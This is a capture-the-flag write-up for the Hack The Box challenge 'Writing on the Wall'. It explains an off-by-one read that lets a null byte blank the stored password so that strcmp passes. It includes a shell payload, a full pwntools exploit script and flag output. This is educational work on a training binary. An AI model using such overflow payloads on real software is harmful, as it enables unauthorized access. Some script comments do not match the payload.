---
title: "Writing on the Wall 🧱 - Stack overflow, pwn"
tags: [HTB, binary exploitation, stack overflow, pwn]
---

# Writing on the Wall 🧱

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints.  

> Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall.  

> Could this be the elusive password, waiting to unveil the door's secrets?

## 📚 Table of Contents
- [Binary Protections Analysis 🛡️](#binary-protections-analysis-️)
- [Program Behavior 📟](#program-behavior-)
- [Reverse Engineering 🔍](#reverse-engineering-)
- [Exploitation Strategy 💣](#exploitation-strategy-)
- [Full Exploit Script 🧨](#full-exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections Analysis 🛡️

We start with `checksec` to analyze binary protections:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'./glibc/'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Despite strong protections like PIE, stack canary, NX, and SHSTK/IBT, a logic vulnerability opens the door for a simple bypass.

## Program Behavior 📟

Upon execution, the binary:

- Loads a fixed password (`0x2073736170743377`)
- Reads 7 bytes into a 6-byte buffer
- Compares the input with the password using `strcmp`
- If the match succeeds, `open_door()` is called

However, if not, an alarm is triggered.

## Reverse Engineering 🔍

In Ghidra or GDB, the function is roughly:

```c
char local_1e[6];
uint64_t local_18 = 0x2073736170743377; // "w3tpass "

read(0, local_1e, 7);
if (strcmp(local_1e, (char *)&local_18) == 0) {
    open_door();
} else {
    error("Troops are coming...");
}
```

Crucially, the `read()` call reads **7 bytes into a 6-byte buffer**, allowing an **overflow** into `local_18`.

## Exploitation Strategy 💣

The goal is to make `strcmp(local_1e, local_18) == 0`.

This can be achieved by:

- Sending a payload that **starts with a null byte** (`\x00`)
- Making sure the overflowed `local_18` also **starts with a null byte** (by writing `\x00` in 7th byte)

Since `strcmp()` compares null-terminated strings, both become `""` (empty), so the comparison passes.

### Valid Payload Example:

```bash
└──╼ $echo -ne '\x00AAAAA\x00' | ./writing_on_the_wall

〰③ ╤ ℙ Å ⅀ ₷

The writing on the wall seems unreadable, can you figure it out?

>> You managed to open the door! Here is the password for the next one: HTB{f4k3_fl4g_4_t35t1ng}
```

Payload explained:
- First `\x00` makes `local_1e` look empty
- Last `\x00` overwrites the `'w'` of `local_18`, turning it into a null byte

## Full Exploit Script 🧨

```python
#!/usr/bin/env python3
from pwn import *
import argparse

context.binary = './writing_on_the_wall'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def build_payload():
    # 6 chars for buffer + 1 to overwrite next byte (likely LSB of saved value)
    return b'\x00\x13\x37\x13\x37\x42\x00'  # includes the trailing space (0x20)

def trigger_exploit(p, payload):
    p.sendafter(b'>>', payload)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for 'writing_on_the_wall'")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

```bash
python3 exploit.py
python3 exploit.py --host 1.2.3.4 --port 1337
```

## Exploitation Result ✅

```
└──╼ $python3 exploit.py --host 83.136.251.68 --port 57446
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 83.136.251.68 on port 57446: Done
[*] Switching to interactive mode
 You managed to open the door! Here is the password for the next one: HTB{4n0th3r_br1ck_0n_th3_w4ll}
```

We bypassed the password check using a buffer overflow that abuses how `strcmp()` handles null-terminated strings.

## Conclusion 🧾

This was a clever little logic-based exploitation challenge. Key takeaways:

- Buffer overflows aren't always about control flow hijacking
- Null bytes can be powerful when dealing with string comparisons
- Exploitation can be simple if you carefully analyze memory layout and behavior

🔙 [Back to Challenge Writeups](../../)
